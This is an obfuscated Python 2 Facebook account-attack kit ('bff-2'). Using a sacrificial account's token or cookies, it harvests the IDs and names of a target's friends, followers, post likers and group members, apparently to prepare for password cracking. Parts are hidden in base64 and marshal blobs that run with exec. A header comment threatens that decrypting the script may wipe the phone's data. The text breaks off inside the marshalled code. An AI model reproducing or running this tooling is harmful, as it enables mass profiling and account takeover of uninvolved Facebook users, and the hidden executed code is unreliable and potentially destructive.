# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak
# Sekedar mengingatkan kalau mau decrypt script ini jangan salahin gw, jika semua data-data di hp (handphone) lu hilang (terhapus)

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Romi Afrizal
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : bff-2
 - version     : 1.1
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    print '\n• modul requests belum terinstall \n'
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    print '\n• modul futures belum terinstall \n'
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    print '\n• modul bs4 belum terinstall \n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64, marshal
from concurrent.futures import ThreadPoolExecutor as Lampung
from datetime import datetime
from bs4 import BeautifulSoup 
from time import sleep as jeda
exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))

ok = []
cp = []
id = []
user = []
loop = 0

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)

def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
        
def folder():
	try:os.mkdir("hasil")
	except:pass
	

# LOGO (LO GOBLOK)
ip = requests.get('https://api.ipify.org').text
exec(base64.b64decode('YXV0aG9yID0iUm9taSBBZnJpemFsIgpmYl9tZSA9ImZhY2Vib29rLmNvbS9yb21pLmFmcml6YWwuMTAyIgpnaXRodWIgPSJnaXRodWIuY29tL01hcmstWnVjayI='))
def banner():
    print (' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n     %s    %s %sCoded by %s: %s%s %s%s   \n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
    (M,til,K,til,H,til,M,til,K,til,H,til,M,P,U,til,K,M,K,author,U,til,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
    print (' %s#%s IP   %s:%s %s%s '%(U,O,M,O,ip,M))
    
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s%s%s 01 %sLogin via token \n%s%s%s 02%s Cara mendapatkan token \n%s%s%s 00 %sKeluar'%(U,til,K,O,U,til,K,O,U,til,M,O))
    kontol = raw_input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
    if kontol in(""):
    	print("%s%s wrong input "%(M,til));exit()
    elif kontol in ('1','01'):
        jalan("\n%s!%s Wajib gunakan akun tumbal dilarang akun utama"%(M,O))
    	romz = raw_input("%s# %sToken %s> %s"%(P,O,M,K))
        if romz in(""):
        	print ("%s%s isi token kentod "%(M,til))
    	try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s%s Login succes, mohon tunggu '%(H,til));jeda(2)
            open('data/token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
        except (KeyError,IOError):
        	print ("%s%s Token invalid "%(M,til));jeda(2);masuk()
    elif kontol in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAAA %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s%s%s Anda paham? %sy%s/%sn :%s '%(U,til,O,H,O,M,K))
        if nanya in(""):
        	print ("%s%s saya bertanya wajib di jawab "%(M,til));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s%s selamat anda pintar :* "%(H,til));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s%s anda sungguh tolol "%(M,til));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif kontol in ('0', '00'):
    	exit()
    else:
    	print("%s%s wrong input "%(M,til));exit()
    
# MASUK COOKIE (KUEH ENAK)
host = ('https://mbasic.facebook.com')
ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return cvd(open('.cok').read().strip())
		else:gen()
	else:gen()
  
def gen(show=True):
	if show==True:
		#os.system("clear")
		#banner()
		print("\n%s%s%s Supaya bekerja masukan cookie facebook anda"%(U,til,O))
	ck=raw_input("%s# %sCookie %s> %s"%(P,O,M,K))
	if ck=="":gen(show=False)
	try:
		cks=cvd(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck);exit("%s%s login success, ketik: python2 bff-2.py "%(H,til))
		else:print("%s%s login gagal."%(M,til));gen(show=True)
	except Exception as e:
		print("%s%s error : %s\n"%(M,til,e))
		gen(show=False)
		
def lang(cookies):
	f=False
	b=requests.get("https://mbasic.facebook.com/profile.php",headers={'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')), 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'},cookies=cookies).text	
	if "mbasic_logout_button" in b.lower():
		f=True
		if f==True:
			return True
		else:
				exit("%s%s login gagal. "%(M,til))
				
def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r

def cvs(cookies): # convert cookie dict to string
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
	
def cvd(cookies): # convert cookie dict to string
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

id = []
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sKetik '%sme%s' jika ingin dump daftar teman sendiri "%(U,til,O,H,O))
        idt = raw_input('%s%s %sTarget id%s > %s'%(U,til,O,M,K))
        #simpan = raw_input('%s%s%s Nama file%s > %s'%(U,til,O,M,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        qq = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        ys = open(qq, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        ys.close()
        print ('\n\n%s%s Succes dump id dari %s'%(H,til,nm['name']))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,qq))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))
       
id = []
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sKetik '%sme%s' jika ingin dump followers sendiri "%(U,til,O,H,O))
        idt = raw_input('%s%s %sTarget id%s  > %s'%(U,til,O,M,K))
        batas = raw_input('%s%s %sMaximal id%s > %s'%(U,til,O,M,K))
        #simpan = raw_input('%s%s%s Nama file%s  > %s'%(U,til,O,M,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        qq = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        ys = open(qq, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print ('\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id)))),
            sys.stdout.flush();jeda(0.0050)

        ys.close()
        print ('\n\n%s%s Succes dump followers dari %s '%(H,til,nm["name"]))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,qq))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))
   
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sPerlu di ingat postingan harus bersifat publik "%(U,til,O))
        idt = raw_input('%s%s %sId post%s   > %s'%(U,til,O,M,K))
        simpan = raw_input('%s%s%s Nama file%s > %s'%(U,til,O,M,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        qq = ('dump/' + simpan + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        ys.close()
        print ('\n\n%s%s Succes dump id postingan '%(H,til))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,qq))
        raw_input('\n%s%s%s Kembali '%(U,til,O))
        menu()
    except Exception as e:
        exit('\n%s%s Failed dump id'%(M,til))

exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xad\x1a\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\x1d\x1a\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s2\x00\x00\x00d\x00\x00d\x06\x00d\x01\x00\x84\x00\x00\x83\x00\x00YZ\x00\x00d\x02\x00\x84\x00\x00Z\x01\x00d\x03\x00\x84\x00\x00Z\x02\x00d\x04\x00\x84\x00\x00Z\x03\x00d\x05\x00S(\x07\x00\x00\x00t\t\x00\x00\x00dump_grupc\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00s,\x00\x00\x00e\x00\x00Z\x01\x00d\x00\x00\x84\x00\x00Z\x02\x00d\x01\x00\x84\x00\x00Z\x03\x00d\x02\x00\x84\x00\x00Z\x04\x00d\x03\x00\x84\x00\x00Z\x05\x00RS(\x04\x00\x00\x00c\x02\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\'\x00\x00\x00g\x00\x00|\x00\x00_\x00\x00|\x01\x00|\x00\x00_\x01\x00|\x00\x00j\x02\x00\x83\x00\x00\x01t\x03\x00\x83\x00\x00\x01d\x00\x00S(\x01\x00\x00\x00N(\x04\x00\x00\x00t\x05\x00\x00\x00glistt\x07\x00\x00\x00cookiest\x06\x00\x00\x00manualt\x04\x00\x00\x00exit(\x02\x00\x00\x00t\x04\x00\x00\x00selfR\x02\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x08\x00\x00\x00__init__\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\t\x01\t\x01\n\x01c\x01\x00\x00\x00\x03\x00\x00\x00\t\x00\x00\x00C\x00\x00\x00s#\x01\x00\x00d\x01\x00t\x00\x00t\x01\x00t\x02\x00f\x03\x00\x16GHt\x03\x00d\x02\x00t\x00\x00t\x01\x00t\x02\x00t\x04\x00t\x05\x00f\x05\x00\x16\x83\x01\x00}\x01\x00|\x01\x00d\x03\x00k\x06\x00rJ\x00|\x00\x00j\x06\x00\x83\x00\x00\x01n\xd5\x00t\x07\x00j\x08\x00t\t\x00j\n\x00d\x04\x00|\x01\x00\x17d\x05\x00t\x0b\x00\x83\x00\x00d\x06\x00|\x00\x00j\x0c\x00\x83\x01\x02j\r\x00d\x07\x00\x83\x02\x00}\x02\x00d\x08\x00|\x02\x00j\x0e\x00d\t\x00\x83\x01\x00j\r\x00j\x0f\x00\x83\x00\x00k\x06\x00r\xb3\x00t\x10\x00d\n\x00t\x04\x00t\x01\x00f\x02\x00\x16\x83\x01\x00\x01nl\x00i\x02\x00|\x01\x00d\x0b\x006|\x02\x00j\x0e\x00d\t\x00\x83\x01\x00j\r\x00d\x0c\x006|\x00\x00_\x11\x00|\x00\x00j\x12\x00\x83\x00\x00\x01d\r\x00t\x00\x00t\x01\x00t\x02\x00t\x04\x00t\x13\x00|\x00\x00j\x11\x00j\n\x00d\x0c\x00\x83\x01\x00d\x0e\x00d\x0f\x00!f\x06\x00\x16GH|\x00\x00j\x14\x00d\x04\x00|\x01\x00\x17\x83\x01\x00\x01d\x00\x00S(\x10\x00\x00\x00NsH\x00\x00\x00\n%s%s%s Perlu di ingat group harus bersifat publik atau wajib join groups\x17\x00\x00\x00%s%s%s Id groups%s > %st\x00\x00\x00\x00s#\x00\x00\x00https://mbasic.facebook.com/groups/t\x07\x00\x00\x00headersR\x02\x00\x00\x00s\x0b\x00\x00\x00html.parsers\x0c\x00\x00\x00konten tidakt\x05\x00\x00\x00titlesI\x00\x00\x00%s%s input id grup yg valid goblok, id error, atau lu belom jooin di grupt\x02\x00\x00\x00idt\x04\x00\x00\x00names\x1b\x00\x00\x00%s%s%s Nama grup%s > %s%s..i\x00\x00\x00\x00i\x14\x00\x00\x00(\x15\x00\x00\x00t\x01\x00\x00\x00Ut\x03\x00\x00\x00tilt\x01\x00\x00\x00Ot\t\x00\x00\x00raw_inputt\x01\x00\x00\x00Mt\x01\x00\x00\x00KR\x03\x00\x00\x00t\x03\x00\x00\x00bs4t\r\x00\x00\x00BeautifulSoupt\x08\x00\x00\x00requestst\x03\x00\x00\x00gett\x05\x00\x00\x00hdcokR\x02\x00\x00\x00t\x04\x00\x00\x00textt\x04\x00\x00\x00findt\x05\x00\x00\x00lowerR\x04\x00\x00\x00t\x06\x00\x00\x00listedt\x01\x00\x00\x00ft\x01\x00\x00\x00Ht\x05\x00\x00\x00dumps(\x03\x00\x00\x00R\x05\x00\x00\x00R\n\x00\x00\x00t\x01\x00\x00\x00r(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgR\x03\x00\x00\x00\x08\x00\x00\x00s\x16\x00\x00\x00\x00\x01\x12\x01\x1f\x01\x0c\x01\r\x024\x01\x1e\x01\x17\x02#\x01\n\x01.\x01c\x01\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00C\x00\x00\x00sd\x00\x00\x00t\x00\x00d\x01\x00t\x01\x00t\x02\x00t\x03\x00t\x04\x00t\x05\x00f\x05\x00\x16\x83\x01\x00j\x06\x00d\x02\x00d\x03\x00\x83\x02\x00|\x00\x00_\x07\x00|\x00\x00j\x07\x00d\x04\x00k\x02\x00rJ\x00|\x00\x00j\x08\x00\x83\x00\x00\x01n\x00\x00t\t\x00|\x00\x00j\x07\x00d\x05\x00\x83\x02\x00j\n\x00\x83\x00\x00\x01d\x00\x00S(\x06\x00\x00\x00Ns\x17\x00\x00\x00%s%s%s Nama file %s> %st\x01\x00\x00\x00 t\x01\x00\x00\x00_R\x07\x00\x00\x00t\x01\x00\x00\x00w(\x0b\x00\x00\x00R\x0f\x00\x00\x00R\x0c\x00\x00\x00R\r\x00\x00\x00R\x0e\x00\x00\x00R\x10\x00\x00\x00R\x11\x00\x00\x00t\x07\x00\x00\x00replacet\x02\x00\x00\x00flR\x1b\x00\x00\x00t\x04\x00\x00\x00opent\x05\x00\x00\x00close(\x01\x00\x00\x00R\x05\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgR\x1b\x00\x00\x00\x17\x00\x00\x00s\x08\x00\x00\x00\x00\x01.\x01\x0f\x00\r\x01c\x02\x00\x00\x00\x07\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00s\xf5\x02\x00\x00t\x00\x00j\x01\x00t\x02\x00j\x03\x00|\x01\x00d\x01\x00|\x00\x00j\x04\x00d\x02\x00t\x05\x00\x83\x00\x00\x83\x01\x02j\x06\x00d\x03\x00\x83\x02\x00}\x02\x00d\x04\x00t\x07\x00t\x08\x00t\t\x00t\n\x00t\x0b\x00t\x0c\x00t\r\x00t\x0e\x00|\x00\x00j\x0f\x00\x83\x01\x00j\x10\x00\x83\x00\x00j\x11\x00\x83\x00\x00\x83\x01\x00\x83\x01\x00f\x06\x00\x16GHt\x12\x00j\x13\x00j\x14\x00\x83\x00\x00\x01t\x15\x00d\x05\x00\x83\x01\x00\x01x\xa0\x01|\x02\x00j\x16\x00d\x06\x00\x83\x01\x00D]\x8f\x01}\x03\x00y|\x01t\r\x00t\x00\x00j\x17\x00j\x18\x00d\x07\x00|\x03\x00j\x19\x00d\x08\x00d\t\x00t\x1a\x00\x83\x01\x01j\x03\x00d\t\x00\x83\x01\x00\x83\x02\x00\x83\x01\x00d\n\x00k\x02\x00r\x14\x02|\x03\x00j\x19\x00d\x08\x00d\t\x00t\x1a\x00\x83\x01\x01}\x04\x00d\x0b\x00|\x04\x00j\x03\x00d\t\x00\x83\x01\x00k\x06\x00r\x8b\x01d\x0c\x00j\x1b\x00t\x00\x00j\x17\x00j\x18\x00d\r\x00|\x04\x00j\x03\x00d\t\x00\x83\x01\x00\x83\x02\x00\x83\x01\x00}\x05\x00t\r\x00|\x05\x00\x83\x01\x00d\x0e\x00k\x02\x00r>\x01w\x93\x00q\x11\x02|\x05\x00t\x0e\x00|\x00\x00j\x0f\x00\x83\x01\x00j\x10\x00\x83\x00\x00k\x06\x00r_\x01w\x93\x00q\x11\x02t\x0e\x00|\x00\x00j\x0f\x00d\x0f\x00\x83\x02\x00j\x1c\x00d\x10\x00|\x05\x00|\x04\x00j\x06\x00f\x02\x00\x16\x83\x01\x00\x01w\x93\x00q\x14\x02d\x0c\x00j\x1b\x00t\x00\x00j\x17\x00j\x18\x00d\x11\x00|\x04\x00j\x03\x00d\t\x00\x83\x01\x00\x83\x02\x00\x83\x01\x00}\x05\x00t\r\x00|\x05\x00\x83\x01\x00d\x0e\x00k\x02\x00r\xca\x01w\x93\x00q\x14\x02|\x05\x00t\x0e\x00|\x00\x00j\x0f\x00\x83\x01\x00j\x10\x00\x83\x00\x00k\x06\x00r\xeb\x01w\x93\x00q\x14\x02t\x0e\x00|\x00\x00j\x0f\x00d\x0f\x00\x83\x02\x00j\x1c\x00d\x10\x00|\x05\x00|\x04\x00j\x06\x00f\x02\x00\x16\x83\x01\x00\x01n\x00\x00Wq\x93\x00\x01\x01\x01q\x93\x00q\x93\x00Xq\x93\x00Wx}\x00|\x02\x00j\x16\x00d\x08\x00d\t\x00t\x1a\x00\x83\x01\x01D]f\x00}\x03\x00d\x12\x00|\x03\x00j\x06\x00k\x06\x00r<\x02xN\x00t\x1a\x00r\x9e\x02y\x1f\x00|\x00\x00j\x1d\x00d\x13\x00|\x03\x00j\x03\x00d\t\x00\x83\x01\x00\x17\x83\x01\x00\x01PWqT\x02\x04t\x1e\x00k\n\x00r\x9a\x02\x01}\x06\x00\x01d\x14\x00|\x06\x00\x16GHqT\x02qT\x02XqT\x02Wq<\x02q<\x02Wd\x15\x00t\x0b\x00t\x08\x00f\x02\x00\x16GHd\x16\x00t\x07\x00t\x08\x00t\t\x00t\n\x00t\x0b\x00|\x00\x00j\x0f\x00f\x06\x00\x16GHt\x1f\x00d\x17\x00t\x07\x00t\x08\x00t\t\x00f\x03\x00\x16\x83\x01\x00\x01t \x00\x83\x00\x00\x01d\x00\x00S(\x18\x00\x00\x00NR\x02\x00\x00\x00R\x08\x00\x00\x00s\x0b\x00\x00\x00html.parsers7\x00\x00\x00\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\rg{\x14\xaeG\xe1zt?t\x02\x00\x00\x00h3s\x02\x00\x00\x00\\/t\x01\x00\x00\x00at\x04\x00\x00\x00hrefi\x01\x00\x00\x00s\x0b\x00\x00\x00profile.phpR\x07\x00\x00\x00s\x17\x00\x00\x00profile\\.php\\?id=(.*?)&i\x00\x00\x00\x00s\x02\x00\x00\x00a+s\x08\x00\x00\x00%s<=>%s\ns\x08\x00\x00\x00/(.*?)\\?s\x17\x00\x00\x00Lihat Postingan Lainnyas\x1c\x00\x00\x00https://mbasic.facebook.com/s\x1a\x00\x00\x00\r\x1b[1;91m\xe2\x80\xa2%s, retrying...s#\x00\x00\x00\n\n%s%s Succes dump id member group s$\x00\x00\x00%s%s%s File dump tersimpan %s>%s %s s\x0f\x00\x00\x00\n%s%s%s kembali(!\x00\x00\x00R\x12\x00\x00\x00R\x13\x00\x00\x00R\x14\x00\x00\x00R\x15\x00\x00\x00R\x02\x00\x00\x00R\x16\x00\x00\x00R\x17\x00\x00\x00R\x0c\x00\x00\x00R\r\x00\x00\x00R\x0e\x00\x00\x00R\x10\x00\x00\x00R\x1c\x00\x00\x00t\x03\x00\x00\x00strt\x03\x00\x00\x00lenR$\x00\x00\x00R#\x00\x00\x00t\x04\x00\x00\x00readt\n\x00\x00\x00splitlinest\x03\x00\x00\x00syst\x06\x00\x00\x00stdoutt\x05\x00\x00\x00flusht\x04\x00\x00\x00jedat\x08\x00\x00\x00find_allt\x02\x00\x00\x00ret\x07\x00\x00\x00findallR\x18\x00\x00\x00t\x04\x00\x00\x00Truet\x04\x00\x00\x00joint\x05\x00\x00\x00writeR\x1d\x00\x00\x00t\t\x00\x00\x00ExceptionR\x0f\x00\x00\x00t\x04\x00\x00\x00menu(\x07\x00\x00\x00R\x05\x00\x00\x00t\x03\x00\x00\x00urlR\x1e\x00\x00\x00t\x01\x00\x00\x00it\x04\x00\x00\x00ogehR\'\x00\x00\x00t\x01\x00\x00\x00e(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgR\x1d\x00\x00\x00\x1c\x00\x00\x00sJ\x00\x00\x00\x00\x010\x01<\x01\r\x00\n\x01\x16\x01\x03\x019\x01\x15\x01\x15\x01\'\x01\x12\x00\x06\x01\x1b\x01\x06\x02&\x01\x06\x02\'\x01\x12\x00\x06\x01\x1b\x01\x06\x02-\x01\x03\x00\x0b\x01\x1c\x01\x0f\x01\t\x01\x03\x01\x1a\x01\x05\x01\x0f\x01\t\x00\x12\x01\x0f\x00\x1e\x00\x17\x00(\x06\x00\x00\x00t\x08\x00\x00\x00__name__t\n\x00\x00\x00__module__R\x06\x00\x00\x00R\x03\x00\x00\x00R\x1b\x00\x00\x00R\x1d\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgR\x00\x00\x00\x00\x01\x00\x00\x00s\x08\x00\x00\x00\x06\x01\t\x06\t\x0f\t\x05c\x01\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s=\x00\x00\x00t\x00\x00j\x01\x00j\x02\x00d\x01\x00\x83\x01\x00r5\x00t\x00\x00j\x01\x00j\x03\x00d\x01\x00\x83\x01\x00d\x02\x00k\x03\x00r.\x00t\x04\x00St\x05\x00Sn\x04\x00t\x05\x00Sd\x00\x00S(\x03\x00\x00\x00Ns\x04\x00\x00\x00.coki\x00\x00\x00\x00(\x06\x00\x00\x00t\x02\x00\x00\x00ost\x04\x00\x00\x00patht\x06\x00\x00\x00existst\x07\x00\x00\x00getsizeR4\x00\x00\x00t\x05\x00\x00\x00False(\x01\x00\x00\x00t\x03\x00\x00\x00arg(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x03\x00\x00\x00cek>\x00\x00\x00s\n\x00\x00\x00\x00\x01\x12\x01\x18\x01\x04\x01\x07\x01c\x00\x00\x00\x00\x06\x00\x00\x00\t\x00\x00\x00C\x00\x00\x00s\x17\x02\x00\x00d\x00\x00}\x00\x00d\x00\x00}\x01\x00d\x00\x00}\x02\x00t\x01\x00d\x01\x00\x83\x01\x00t\x02\x00k\x02\x00rx\x00y;\x00t\x03\x00d\x02\x00t\x04\x00t\x05\x00t\x06\x00t\x07\x00t\x06\x